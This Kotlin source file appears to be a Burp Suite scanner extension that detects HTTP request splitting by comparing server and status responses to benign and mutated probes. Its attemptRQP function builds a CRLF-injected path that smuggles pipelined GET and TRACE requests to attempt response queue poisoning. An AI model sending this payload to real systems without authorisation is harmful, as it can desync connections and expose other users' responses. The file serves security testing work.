package burp

import burp.ReqMutator.Companion.headerBasedMutations
import burp.ReqMutator.Companion.paramMinerMutations
import burp.ReqMutator.Companion.pathBasedMutations
import burp.ReqMutator.Companion.protocolBasedMutations
import burp.ReqMutator.Companion.smuggleBasedMutations
import burp.api.montoya.http.HttpMode
import burp.api.montoya.http.message.HttpRequestResponse
import burp.api.montoya.http.message.requests.HttpRequest
import burp.api.montoya.http.message.responses.analysis.AttributeType
import jdk.internal.net.http.common.Log.requests
import java.net.URI
import java.net.URL
import kotlin.random.Random


//this is a basic scan check implementation
internal class ReqSplit(name: String?) : Scan(name) {

    val interestingAttributes = setOf(
        AttributeType.STATUS_CODE,
        AttributeType.CONTENT_TYPE,
        AttributeType.LINE_COUNT,
        AttributeType.WORD_COUNT
        //AttributeType.CONTENT_LENGTH - produces a LOT of false positives...
    )

    val mutator = ReqMutator()

    //Init is a constructor in Kotlin. Import any settings you wanted outside of the global ones
    init {
        super.name

        scanSettings.register("Filter Known FP", true)
        // scanSettings.register("Enable dodgy BPS diff", false, "If predicted match fails, report findings based Backslash Powered Scanner-style diff") // We don't need this anymore since we report a "firmer" version if we can and then follow up with diff afterwards.
        // That said, might be usedful for param-miner-style guessing of headers for header smuggling etc?
        scanSettings.register("Enable param-miner headers", false, "Check for any header in the param-miner list that causes a significant difference in the response (server header + status)")
	    scanSettings.register("maintain path", false)
        scanSettings.register("Log issues to output", false)
        scanSettings.register("Enable follow up", true, "Follow up with a few more probes to better confirm true positives.")
        //scanSettings.register("include query-param in cachebusters", false, "Breaks things sometimes...") //Maybe this doesn't break things...
        scanSettings.register("Enable fallback diff", true, "Fallback to diffing <serverStatus> if expected match fails")
        scanSettings.register("Encode-colons", true, ": -> %3a")
        scanSettings.register("Encode-forward-slash", true, "/ -> %2f")
        scanSettings.register("Add cache buster", true, "Disable if you fancy a chance at a http1mustdie-style CDN desync")
        scanSettings.register("attempt poc", false, "Automatically follow up with RQP attempt")
        scanSettings.importSettings(BurpExtender.configSettings)
        scanSettings.importSettings(headerBasedMutations)
        scanSettings.importSettings(pathBasedMutations)
        scanSettings.importSettings(protocolBasedMutations)
        scanSettings.importSettings(smuggleBasedMutations)
        //scanSettings.importSettings(paramMinerMutations) NO don't do this.

    }

    //this is where your scan logic goes
    override fun doScan(baseReq: ByteArray, service: IHttpService): MutableList<IScanIssue> {

	    val wafChecker = WAFChecker()

        var pocHasRun = false

        // Add all the enabled permutations types
        val enabledMutations = arrayListOf<String>()
        for (mutation in headerBasedMutations.settings) {
            if (Utilities.globalSettings.getBoolean(mutation)) {
                enabledMutations.add(mutation)
            }
        }
        for (mutation in pathBasedMutations.settings) {
            if (Utilities.globalSettings.getBoolean(mutation)) {
                enabledMutations.add(mutation)
            }
        }
        for (mutation in protocolBasedMutations.settings) {
            if (Utilities.globalSettings.getBoolean(mutation)) {
                enabledMutations.add(mutation)
            }
        }
        for (mutation in smuggleBasedMutations.settings) {
            if (Utilities.globalSettings.getBoolean(mutation)) {
                enabledMutations.add(mutation)
            }
        }
        //Add param miner headers if enabled
        if (Utilities.globalSettings.getBoolean("Enable param-miner headers")) {
            for (mutation in paramMinerMutations.settings) {
                enabledMutations.add(mutation)
            }
        }

        var hpMode = HttpMode.AUTO


        if (Utilities.isHTTP2(baseReq)) {
            hpMode = HttpMode.HTTP_2
        } else {
            hpMode = HttpMode.HTTP_1
        }

        // for (permutation in permutations) {} //As per the PDS from http1mustdie...
        for (technique in enabledMutations) {
            if (Utilities.unloaded.get()) {
                break
            }

            val baseRequest: HttpRequest

            //Add OPTIONAL cache buster...
            if (Utilities.globalSettings.getBoolean("Add cache buster")) {
                baseRequest = Utilities.buildMontoyaReq(Utilities.addCacheBuster(baseReq, Utilities.generateCanary()), service)
            } else {
                baseRequest = Utilities.buildMontoyaReq(baseReq, service)
            }

            var currentStatusDiff = ""
            var previousStatusDiff = ""

            lateinit var previousBenignRequestResponse: HttpRequestResponse
            lateinit var previousProbeRequestResponse: HttpRequestResponse

            lateinit var benignRequestResponse: HttpRequestResponse
            lateinit var probeRequestResponse: HttpRequestResponse

            val probe = mutator.getProbe(baseRequest, technique)


            //Check each probe 5 times for consistency...
            for (i in 1..Utilities.globalSettings.getInt("confirmations")) {
                if (Utilities.unloaded.get()) {
                    break
                }

                val sendBenignRequest = {
                    benignRequestResponse = Utilities.montoyaApi.http().sendRequest(probe.benignRequest, hpMode)

                    !responseHasErrors(benignRequestResponse) //indicate failure
                }

                val sendProbeRequest = {
                    probeRequestResponse = Utilities.montoyaApi.http().sendRequest(probe.probeRequest, hpMode)

                    !(responseHasErrors(probeRequestResponse) && !technique.contains(
                        "timeout",
                        true
                    )) //If it's an expected timeout, don't check for errors
                    //indicate failure
                }


                //Randomly choose which probe goes first...
                val runSuccess = if (Random.nextBoolean()) {
                    sendBenignRequest() && sendProbeRequest()
                } else {
                    sendProbeRequest() && sendBenignRequest()
                }

                //Exit if either probe failed
                if (!runSuccess) {
                    currentStatusDiff = ""
                    break
                }

                //Check if the responses are inconsistent on their own...
                if (i != 1) { //Skip on first run...

                    //Benign
                    if (serverStatus(benignRequestResponse) != serverStatus(previousBenignRequestResponse)) {
                        currentStatusDiff = ""
                        break
                    }

                    //Probe
                    if (serverStatus(probeRequestResponse) != serverStatus(previousProbeRequestResponse)) {
                        currentStatusDiff = ""
                        break
                    }
                }

                //Set previous responses to keep track...
                previousBenignRequestResponse = benignRequestResponse
                previousProbeRequestResponse = probeRequestResponse


                //If no difference in responses... then give up
                if (serverStatus(probeRequestResponse) == serverStatus(benignRequestResponse)) {
                    currentStatusDiff = ""
                    break
                }

                currentStatusDiff = serverStatus(benignRequestResponse) + "|" + serverStatus(probeRequestResponse)


                //If after the current repeat our <server><status> strings don't match... somethings inconsistent regardless of probe
                if (i != 1 && previousStatusDiff != currentStatusDiff) {
                    //Make the attributes empty so we can prevent reporting
                    currentStatusDiff = ""
                    break
                }

                //If we don't hit all the expected response matches when "Enable fallback Diff" is disabled, we can exit.
                if (!Utilities.globalSettings.getBoolean("Enable fallback diff")) {
                    for (match in probe.expectedResponseMatches) {
                        if (!probeRequestResponse.response().contains(match, true)) {
                            //If fallback diff isn't enabled, then we can exit early here
                            currentStatusDiff = ""
                            break
                        }
                    }
                }

                previousStatusDiff = currentStatusDiff
            }

            // This should be set to "" if there is no difference
            if (currentStatusDiff.isNotEmpty()) {

                //Check for known false positives...
                if (Utilities.globalSettings.getBoolean("Filter Known FP") && (wafChecker.isWafResponse(probeRequestResponse.response()) || wafChecker.isWafResponse(benignRequestResponse.response()))) {
                    continue
                }

                //If we hit the exact match we hoped for... report immediately
                //Needs updating i think... should maybe still proove that we got a different response... :thinking:
                var numberOfMatches = 0

                if (!technique.contains("timeout", true)) {
                    probe.expectedResponseMatches.forEach {
                        match ->
                            //Check for generic matches...
//                            if (match == "TIMEOUT") {
//                                if (!probeRequestResponse.hasResponse()) {
//                                    numberOfMatches += 1
//                                }
//                                if (!benignRequestResponse.hasResponse()) {
//                                    numberOfMatches = 0
//                                }
//                            }
                            if (match == "NO_HEADERS") {
                                if (probeRequestResponse.response().statusCode() == "0".toShort()) {
                                    numberOfMatches += 1
                                }
                                if (benignRequestResponse.response().statusCode() == "0".toShort()) {
                                    numberOfMatches = 0
                                }
                            } else {

                                if (probeRequestResponse.response().contains(match, true)) {
                                    numberOfMatches += 1
                                }

                                if (benignRequestResponse.response().contains(match, true)) {
                                    numberOfMatches = 0 //set to 0 to cause the logic below to fail... if the match also appears in the base response it's probably nothing...
                                }
                            }
                    }
                    if (numberOfMatches != 0 && numberOfMatches == probe.expectedResponseMatches.size) { //If we got a match on every entry one of the expected response matches.

                        // todo Validate this further by removing the parts that should actually make this work...
                        // todo launch an optional attack for quickly check for desync via RQP or similar? :thinking:
                        if (!confirmedVulnerable(probeRequestResponse, technique) && Utilities.globalSettings.getBoolean("Enable follow up")) {
                            // followUp tells us it's a FP
                            continue
                        }

                        var statusDiffString = """
                            <table>
                                <tr>
                                    <td><b>Base<b></td>
                                    <td><b>Probe<b></td>
                                </tr>
                        """.trimIndent()

                            statusDiffString += """
                            <tr>
                                <td>${currentStatusDiff.split("|")[0]}</td>
                                <td>${currentStatusDiff.split("|")[1]}</td>
                            </tr>
                        """.trimIndent()

                        statusDiffString += "</table>"

                        //Fix broken responses... (responses without status codes...)
                        if (probeRequestResponse.response().statusCode() == "0".toShort()) {
                            probeRequestResponse = HttpRequestResponse.httpRequestResponse(probeRequestResponse.request(), probeRequestResponse.response().withStatusCode("1337".toShort()))
                        }

                        // Attempt poc (before report otherwise our logic  breaks...)
                        if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") || Utilities.globalSettings.getBoolean("skip flagged hosts")) {
                            if (BulkUtilities.callbacks.getScanIssues(benignRequestResponse.request().httpService().toString()).isEmpty()) {
                                if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
                                    pocHasRun = true
                                    attemptRQP(baseRequest)
                                }
                            }
                        } else if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
                            pocHasRun = true
                            attemptRQP(baseRequest)
                        }

                        

                        report("Request Splitting via $technique",
                            """
                            The application behaves in a manner that is consistent with HTTP Request Splitting...<br>
                            $statusDiffString
                            """,
                            benignRequestResponse,
                            probeRequestResponse
                        )

                        if (Utilities.globalSettings.getBoolean("Log issues to output")) {
                            Utilities.out("Request Splitting via $technique at ${benignRequestResponse.request().url()}")
                        }

                        continue
                    }
                }

                if (!Utilities.globalSettings.getBoolean("Enable fallback diff")) {
                    continue
                }

                //Skip any techniques that we don't care about checking response attributes for OR just skip altogether if not enabled
                if (technique in listOf("robots", "sitemap", "favicon")) {
                    continue
                }

                // todo Validate this further by removing the parts that should actually make this work...
                if (!confirmedVulnerable(probeRequestResponse, technique) && Utilities.globalSettings.getBoolean("Enable follow up")) {
                    // followUp tells us it's a FP
                    continue
                }

                var statusDiffString = """
                    <table>
                        <tr>
                            <td><b>Base<b></td>
                            <td><b>Probe<b></td>
                        </tr>
                """.trimIndent()

                statusDiffString += """
                    <tr>
                        <td>${currentStatusDiff.split("|")[0]}</td>
                        <td>${currentStatusDiff.split("|")[1]}</td>
                    </tr>
                """.trimIndent()

                statusDiffString += "</table>"

                // Attempt poc (before report otherwise our logic  breaks...)
                if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") || Utilities.globalSettings.getBoolean("skip flagged hosts")) {
                    if (BulkUtilities.callbacks.getScanIssues(benignRequestResponse.request().httpService().toString()).isEmpty()) {
                        if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
                            pocHasRun = true
                            attemptRQP(baseRequest)
                        }
                    }
                } else if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
                    pocHasRun = true
                    attemptRQP(baseRequest)
                }

                report(
                    "Request Splitting via $technique - Dodgy", """
                    The application behaves in a manner that is consistent with HTTP Request Splitting...Sort of:<br>
                    $statusDiffString
                     """, benignRequestResponse, probeRequestResponse
                )

                if (Utilities.globalSettings.getBoolean("Log issues to output")) {
                    Utilities.out("Request Splitting via $technique - Dodgy - at ${benignRequestResponse.request().url()}")
                }

                continue
            }
        }



        return mutableListOf<IScanIssue>()
    }

    fun attemptRQP(baseRequest: HttpRequest): Boolean {

        var basePath = "/"
        if (Utilities.globalSettings.getBoolean(("maintain path"))) {
            basePath = baseRequest.pathWithoutQuery()
        }

        //Attack string is a RQP gadget I hope might work
        val attackRequest = baseRequest.withPath("$basePath%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                + "TRACE%20/%20HTTP/1.1%0d%0aX:%20x")

        var previousServerStatus = ""

        for (i in 0..100) {
            val attackRequestResponse = Utilities.montoyaApi.http().sendRequest(attackRequest)
            if (i == 0) {
                previousServerStatus = serverStatus(attackRequestResponse)
                continue
            }
            val currentServerStatus = serverStatus(attackRequestResponse)

            if (previousServerStatus != currentServerStatus) {
                reportToOrganiser("RQP!?!?!?!\r\n$previousServerStatus|$currentServerStatus", attackRequestResponse)
                return true
            }
        }
        return false
    }

}

fun responseHasErrors(requestResponse: HttpRequestResponse): Boolean {
    if (!requestResponse.hasResponse()) {
        return true
    }
    if (requestResponse.response().toString().isEmpty()) {
        return true
    }
    if (requestResponse.response().statusCode() == "429".toShort()) {
        return true
    }
    return false
}

fun fixMissingStatuscode(requestResponse: HttpRequestResponse): HttpRequestResponse {
    val fixedRequestResponse = HttpRequestResponse.httpRequestResponse(requestResponse.request(), requestResponse.response().withStatusCode("1337".toShort()).withReasonPhrase("No response headers received"))
    return fixedRequestResponse
}

fun serverStatus(reqResp: HttpRequestResponse): String {
    if (!reqResp.hasResponse()) {
        return "TIMEOUT"
    }

    val resp = reqResp.response()

    val serverHeaderValue: String
    if (resp.hasHeader("Server")) {
        serverHeaderValue = resp.headerValue("Server")
    } else {
        serverHeaderValue = ""
    }
    if (resp.statusCode() == "0".toShort()) {
        return resp.statusCode().toString()
    } else {
        return serverHeaderValue + resp.statusCode().toString() // E.g. nginx505
    }
    // serverStatus() = "0" if no sheader or status code or it'll just be 404 if no sheader or just nginx0 if server header but no status code
}

fun confirmedVulnerable(probeReqResp: HttpRequestResponse, technique: String): Boolean {
    //Filter out ones that will break.... robots.txt?anything will of course work so...
    if (technique in listOf("robots", "sitemap", "favicon")) {
        return true
    }


    //Add %3f after the path?
    val withQueryProbePath = probeReqResp.request().pathWithoutQuery().replaceFirst("%20", "?%20")
    val withQueryProbeReq = probeReqResp.request().withPath(withQueryProbePath)
    val confirmReqResp = Utilities.montoyaApi.http().sendRequest(withQueryProbeReq)

    if (serverStatus(confirmReqResp) == serverStatus(probeReqResp)) {
        //If we get the same response haveing made the entire path a query component... it's a FP
        return false
    }

    val confirmReqResp2 = Utilities.montoyaApi.http().sendRequest(withQueryProbeReq.withPath(withQueryProbePath.replaceFirst("?%20", "%3f%20")))

    if (serverStatus(confirmReqResp2) != serverStatus(probeReqResp)) {
        //if encoding the query then produces the a different serverStatus it's a FP... nginx should be fine with this
        return false
    }



    return true


    //TODO these techniques were not very good... Great at filtering out FP, but really bad a filtering out TP also
//    // Remove HTTP/1.1%0d%0a
//    val noProbePath = probeReqResp.request().pathWithoutQuery().replace(Regex("HTT[P,X]/[0-9]{1,2}\\.[0-9]{1,2}%0d%0a"), "") //remove CLRF to ensure it's not any other part of the payload that triggers interesting behaviour
//    val confirmReq = probeReqResp.request().withPath(noProbePath)
//
//    val confirmReqResp = Utilities.montoyaApi.http().sendRequest(confirmReq)
//
//    if (serverStatus(confirmReqResp) == serverStatus(probeReqResp)) {
//        //With removed CLRF injections... this should no way have made the same response...
//        return false
//    }
//
//    // Remove only HTTP/1.1
//    val noHttpPath = probeReqResp.request().pathWithoutQuery().replace(Regex("HTT[P,X]/[0-9]{1,2}\\.[0-9]{1,2}"), "") // remove anything except %0d%0a
//    val confirmReqNoHttp = probeReqResp.request().withPath((noHttpPath))
//
//    val confirmReqRespNoHttp = Utilities.montoyaApi.http().sendRequest(confirmReqNoHttp)
//
//    if (serverStatus(confirmReqRespNoHttp) == serverStatus(probeReqResp)) {
//        // If still the same then probably a WAF or FP
//        return false
//    }
    // If they still differ, good, time to report
    // Could follow up further here...Perhaps remove only HTTP/X.X to see if it is the %0d%0a that causes the issue... would work on most WAFs too since if %0d%0aHeader:%20value is the same response... it was likely WAF
}
